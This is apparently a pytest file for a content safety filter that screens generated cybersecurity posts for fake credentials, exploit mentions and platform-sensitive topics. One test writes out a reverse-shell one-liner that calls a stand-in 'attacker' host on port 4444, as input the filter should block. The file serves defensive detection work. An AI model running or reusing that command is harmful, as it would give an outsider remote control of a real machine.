"""Tests for the content safety filter."""

from zcyber_xhs.safety import check_and_fix, check_content


def test_clean_content_passes():
    result = check_content(
        title="忘记zip密码怎么办",
        body="用fcrackzip一行命令搞定，仅限自己设备使用。",
        tags=["#网络安全"],
    )
    assert result.passed


def test_real_api_key_blocked():
    result = check_content(
        title="Test",
        body="Use this key: sk-1234567890abcdefghijklmnop to authenticate.",
        tags=[],
    )
    assert not result.passed
    assert any("credential" in b.lower() for b in result.blocks)


def test_aws_key_blocked():
    result = check_content(
        title="AWS Setup",
        body="Set your key AKIAIOSFODNN7EXAMPLE in the config.",
        tags=[],
    )
    assert not result.passed


def test_github_pat_blocked():
    result = check_content(
        title="Git config",
        body="Use ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh as your token.",
        tags=[],
    )
    assert not result.passed


def test_exploit_pattern_blocked():
    result = check_content(
        title="Hacking tutorial",
        body="Start msfconsole and select the exploit module.",
        tags=[],
    )
    assert not result.passed
    assert any("exploit" in b.lower() or "c2" in b.lower() for b in result.blocks)


def test_reverse_shell_blocked():
    result = check_content(
        title="Test",
        body="Run bash -i >& /dev/tcp/attacker/4444 0>&1",
        tags=[],
    )
    assert not result.passed


def test_xhs_sensitive_blocked():
    result = check_content(
        title="如何翻墙",
        body="教你科学上网的方法。",
        tags=[],
    )
    assert not result.passed


def test_private_ips_not_flagged():
    """Private/documentation IPs should not trigger warnings."""
    result = check_content(
        title="Network scan",
        body="Scan your local network: nmap -sn 192.168.1.0/24",
        tags=["#网络安全"],
    )
    assert result.passed
    # Private IPs should not generate real-IP warnings
    assert not any("IP" in w for w in result.warnings)


def test_safety_disclaimer_auto_fix():
    result, fixed = check_and_fix(
        title="Cracking passwords",
        body="Use fcrackzip to recover your zip password.",
        tags=["#安全"],
        safety_disclaimer_needed=True,
        safety_disclaimer="仅限自己设备/授权测试",
    )
    assert "仅限自己设备/授权测试" in fixed


def test_disclaimer_not_duplicated():
    original = "Some body text.\n\n⚠️ 仅限自己设备/授权测试"
    result, fixed = check_and_fix(
        title="Test",
        body=original,
        tags=[],
        safety_disclaimer_needed=True,
        safety_disclaimer="仅限自己设备/授权测试",
    )
    assert fixed.count("仅限自己设备/授权测试") == 1


def test_short_body_warning():
    result = check_content(
        title="Test title",
        body="Short",
        tags=["#tag"],
    )
    assert result.passed  # warnings don't block
    assert any("short" in w.lower() for w in result.warnings)


def test_example_commands_pass():
    """Normal example commands should not be blocked."""
    result = check_content(
        title="端口扫描教程",
        body=(
            "使用nmap扫描局域网：nmap -sn 192.168.1.0/24\n"
            "查看开放端口：nmap -p- 10.0.0.1\n"
            "仅限自己设备/授权测试"
        ),
        tags=["#网络安全", "#nmap"],
    )
    assert result.passed
